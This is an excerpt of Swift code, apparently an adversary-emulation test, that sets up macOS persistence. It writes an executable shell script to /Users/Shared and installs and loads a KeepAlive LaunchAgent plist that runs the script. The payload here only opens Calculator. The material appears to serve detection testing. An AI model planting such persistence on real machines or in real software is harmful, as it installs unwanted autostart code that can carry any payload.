...
print("This TTP will create LaunchAgent persistence to call a shell script that opens Calc")
...
let fileMan = FileManager.default
	...
	try fileMan.createFile(atPath: "/Users/Shared/calc.sh", contents: script2, attributes: nil)

	var attributes = [FileAttributeKey : Any]()
	attributes[.posixPermissions] = 0o755
	try fileMan.setAttributes(attributes, ofItemAtPath: "/Users/Shared/calc.sh")
        ...
        let plist = """
         ...
         <dict>
            ...
            <array>
                <string>bash</string>
                <string>-c</string>
                <string>/Users/Shared/calc.sh</string>
            </array>
            <key>KeepAlive</key>
            <true/>
         </dict>
        ...
        if fileMan.fileExists(atPath: "/Users/\(username)/Library/LaunchAgents", isDirectory: &isDir){
            ...
            try fileMan.createFile(atPath: "/Users/\(username)/Library/LaunchAgents/com.ttpforge.plist", contents: plist2, attributes: nil)
        ...
        let args : [String] = ["load","-w", "/Users/\(username)/Library/LaunchAgents/com.ttpforge.plist"]
        proc.arguments = args
        let pipe = Pipe()
        ...
        if fileMan.fileExists(atPath: "/Users/\(username)/Library/LaunchAgents/com.ttpforge.plist"){
            retString = "[+] Successfully loaded com.ttpforge.plist"
            print(retString)
